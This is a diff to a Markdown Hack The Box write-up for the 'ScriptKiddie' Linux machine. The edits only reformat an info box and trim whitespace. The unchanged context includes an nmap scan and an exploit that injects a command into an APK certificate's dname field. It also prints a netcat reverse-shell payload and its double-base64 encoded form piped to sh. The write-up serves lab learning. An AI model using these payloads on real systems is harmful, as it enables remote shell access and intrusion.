@@ -19,8 +19,9 @@ Hello guys!
 
 This week's machine will be **ScriptKiddie**, another easy-rated Linux box from [Hack The Box](https://www.hackthebox.eu), created by [0xdf](https://app.hackthebox.eu/users/4935).
 
-\:information\_source: **Info**:  Write-ups for Hack The Box machines are posted as soon as they’re retired.
-\[info]
+<Alert kind="info" title="Info">
+  Write-ups for Hack The Box machines are posted as soon as they're retired.
+</Alert>
 
 ![HTB ScriptKiddie](https://i.imgur.com/Igno8wu.png)
 
@@ -29,7 +30,7 @@ This week's machine will be **ScriptKiddie**, another easy-rated Linux box from 
 As usual, started running a `nmap` quick scan, to see which services were published on this machine.
 
 ```bash
-$ nmap -sC -sV -Pn -oA quick 10.10.10.226                                                                   
+$ nmap -sC -sV -Pn -oA quick 10.10.10.226
 
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-24 14:05 -03
@@ -91,7 +92,7 @@ dname = f"CN='|echo -n {payload_b64} {decode} | sh #"
 Below we can see the output of the execution which generates the `evil.apk` file.
 
 ```bash
-$ python3 49491.py                                                                                                               
+$ python3 49491.py
 [+] Manufacturing evil apkfile
 Payload: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f
 -dname: CN='|echo -n Y20wZ0wzUnRjQzltTzIxclptbG1ieUF2ZEcxd0wyWTdZMkYwSUM5MGJYQXZabnd2WW1sdUwzTm9JQzFwSURJK0pqRjhibU1nTVRBdU1UQXVNVFF1TVRNMklEUTBORE1nUGk5MGJYQXZaZz09 | base64 -d | base64 -d | sh #
